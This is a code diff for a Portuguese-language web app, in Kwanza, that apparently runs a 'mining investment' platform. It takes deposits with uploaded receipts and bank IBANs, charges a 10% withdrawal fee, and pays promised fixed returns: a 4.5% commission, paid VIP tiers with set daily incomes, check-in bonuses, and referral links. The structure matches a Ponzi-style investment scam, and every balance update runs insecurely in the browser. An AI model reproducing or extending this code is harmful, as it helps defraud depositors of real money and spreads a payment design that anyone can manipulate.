+                extrato: arrayUnion({ data: new Date().toLocaleString(), valor: v, tipo: "dep", status: "análise", desc: "Depósito efetuado para análise", comprovante: img }) 
             });
-            notify("Lucro de " + lucro.toFixed(2) + " Kz recebido!");
+            avisar("ENVIADO COM SUCESSO!"); ir('home');
         };
 
-        // INVESTIR
-        document.getElementById("btn-invest").onclick = async () => {
-            const v = parseFloat(document.getElementById("activate-amount").value);
-            if(!v || v < 100) return notify("Mínimo: 100 Kz", "error");
-            
-            const uRef = ref(db, "users/" + userLogged);
-            const snap = await get(uRef);
-            const d = snap.val();
-            
-            if(d.balance < v) return notify("Saldo insuficiente", "error");
+        window.salvarBanco = async () => {
+            const i = document.getElementById('b-iban').value;
+            if(i.length < 10) return avisar("IBAN INVÁLIDO");
+            await updateDoc(doc(db, "usuarios", userID), { banco: document.getElementById('b-sel').value, titular: document.getElementById('b-tit').value, iban: i });
+            avisar("CONTA SALVA!"); ir('perfil');
+        };
 
-            await update(uRef, { balance: d.balance - v, mining: (d.mining || 0) + v });
-            await push(ref(db, "transactions"), { user: userLogged, valor: v, tipo: "INVESTIMENTO", status: "CONCLUÍDO", data: new Date().toLocaleString() });
+        window.calcSaq = (v) => { document.getElementById('v-liq').innerText = (v * 0.9).toFixed(2) + " KZ"; };
 
-            if(d.invitedBy && d.invitedBy !== "direto") {
-                const pRef = ref(db, "users/" + d.invitedBy);
-                const pSnap = await get(pRef);
-                if(pSnap.exists()){
-                    const bonus = v * 0.10;
-                    await update(pRef, { balance: (pSnap.val().balance || 0) + bonus });
-                    await push(ref(db, "transactions"), { 
-                        user: d.invitedBy, valor: bonus, tipo: "BÓNUS REFERÊNCIA", status: "CONCLUÍDO", data: new Date().toLocaleString() + " (Ref: " + userLogged + ")" 
+        window.solicitarSaque = async () => {
+            const v = parseFloat(document.getElementById('v-saq').value), u = (await getDoc(doc(db, "usuarios", userID))).data();
+            if(!v || v < 300 || (u.saldo||0) < v) return avisar("SALDO INSUFICIENTE");
+            if(!u.iban) return avisar("CADASTRE CONTA NO PERFIL");
+            const vFinal = (v * 0.9).toFixed(2);
+            await updateDoc(doc(db, "usuarios", userID), { 
+                saldo: u.saldo - v, 
+                extrato: arrayUnion({ data: new Date().toLocaleString(), valor: "-"+vFinal, tipo: "saq", status: "pendente", desc: "Saque solicitado" }) 
+            });
+            avisar("SAQUE SOLICITADO!"); ir('home');
+        };
+
+        window.investir = async () => {
+            const val = parseFloat(document.getElementById('val-in').value), ref = doc(db, "usuarios", userID), u = (await getDoc(ref)).data();
+            if(!val || val < 100 || (u.saldo||0) < val) return avisar("SALDO INSUFICIENTE");
+            await updateDoc(ref, { 
+                saldo: u.saldo - val, investido: (u.investido||0) + val,
+                extrato: arrayUnion({ data: new Date().toLocaleString(), valor: "-"+val, tipo: "saq", status: "concluido", desc: "Investimento em Mineração" })
+            });
+            avisar("MÁQUINA ATIVA!"); ir('mine');
+        };
+
+        window.receberComissao = async () => {
+            const u = (await getDoc(doc(db, "usuarios", userID))).data();
+            if((u.investido||0) <= 0) return avisar("SEM INVESTIMENTOS");
+            const lucro = parseFloat((u.investido * 0.045).toFixed(2));
+            await updateDoc(doc(db, "usuarios", userID), { 
+                saldo: (u.saldo||0) + lucro, r_hoje: (u.r_hoje||0) + lucro, r_total: (u.r_total||0) + lucro,
+                extrato: arrayUnion({ data: new Date().toLocaleString(), valor: "+"+lucro, tipo: "dep", status: "aprovado", desc: "Renda da comissão" })
+            });
+            avisar("LUCRO RECEBIDO!"); ir('mine');
+        };
+
+        window.checkin = async () => {
+            const d = new Date().toLocaleDateString(), ref = doc(db, "usuarios", userID), u = (await getDoc(ref)).data();
+            if(u.checkin === d) return avisar("JÁ FEITO HOJE");
+            await updateDoc(ref, { saldo: (u.saldo||0) + 4, checkin: d, extrato: arrayUnion({ data: d, valor: "+4", tipo: "dep", status: "aprovado", desc: "Chik-in diário" }) });
+            avisar("+4 KZ!"); ir('vip');
+        };
+
+        window.upVIP = async (v, n) => {
+            const u = (await getDoc(doc(db, "usuarios", userID))).data();
+            if((u.saldo||0) < v) return avisar("SALDO INSUFICIENTE");
+            await updateDoc(doc(db, "usuarios", userID), { 
+                saldo: u.saldo - v, vip: n, 
+                extrato: arrayUnion({ data: new Date().toLocaleString(), valor: "-"+v, tipo: "saq", status: "concluido", desc: "Upgrade VIP "+n }) 
+            });
+            avisar("VIP ATIVADO!"); ir('vip');
+        };
+
+        window.copiarLink = () => { const i = document.getElementById('link-c'); i.select(); navigator.clipboard.writeText(i.value); avisar("LINK COPIADO!"); };
+
+        // SISTEMA AUTOMÁTICO 00:00
+        setInterval(async () => {
+            const agora = new Date();
+            if(agora.getHours() === 0 && agora.getMinutes() === 0 && userID) {
+                const u = (await getDoc(doc(db, "usuarios", userID))).data();
+                if((u.vip || 0) > 0) {
+                    const rendas = [0, 675, 2025, 4050, 8100, 16200, 32400];
+                    const ganho = rendas[u.vip];
+                    await updateDoc(doc(db, "usuarios", userID), { 
+                        saldo: (u.saldo||0) + ganho, r_hoje: ganho, r_ontem: (u.r_hoje||0), r_total: (u.r_total||0) + ganho,
+                        extrato: arrayUnion({ data: agora.toLocaleDateString(), valor: "+"+ganho, tipo: "dep", status: "aprovado", desc: "Renda do VIP" })
                     });
                 }
             }
-            notify("Plano ativado!");
-            document.getElementById("activate-amount").value = "";
-        };
-
-        // NAV E TABS
-        const navs = ["home", "ganhos", "equipa", "extrato"];
-        navs.forEach(n => {
-            document.getElementById("nav-"+n).onclick = () => {
-                navs.forEach(x => { document.getElementById("view-"+x).classList.add("hidden"); document.getElementById("nav-"+x).className = "flex flex-col items-center text-zinc-500"; });
-                document.getElementById("view-"+n).classList.remove("hidden");
-                document.getElementById("nav-"+n).className = "flex flex-col items-center tesla-orange font-bold";
-            };
-        });
-
-        document.getElementById("btn-copy").onclick = () => {
-            const link = document.getElementById("invite-link"); link.select();
-            document.execCommand("copy"); notify("Link copiado!");
-        };
-
-        document.getElementById("tab-login").onclick = () => {
-            authMode = "login"; document.getElementById("confirm-pass-container").classList.add("hidden");
-            document.getElementById("tab-login").className = "flex-1 py-4 auth-tab-active text-[10px] uppercase";
-            document.getElementById("tab-register").className = "flex-1 py-4 text-zinc-400 font-bold text-[10px] uppercase";
-        };
-        document.getElementById("tab-register").onclick = () => {
-            authMode = "register"; document.getElementById("confirm-pass-container").classList.remove("hidden");
-            document.getElementById("tab-register").className = "flex-1 py-4 auth-tab-active text-[10px] uppercase";
-            document.getElementById("tab-login").className = "flex-1 py-4 text-zinc-400 font-bold text-[10px] uppercase";
-        };
+        }, 60000);
     </script>
-                                                                                                                             </body>
-                                                                                                                             
+</body>
+</html>
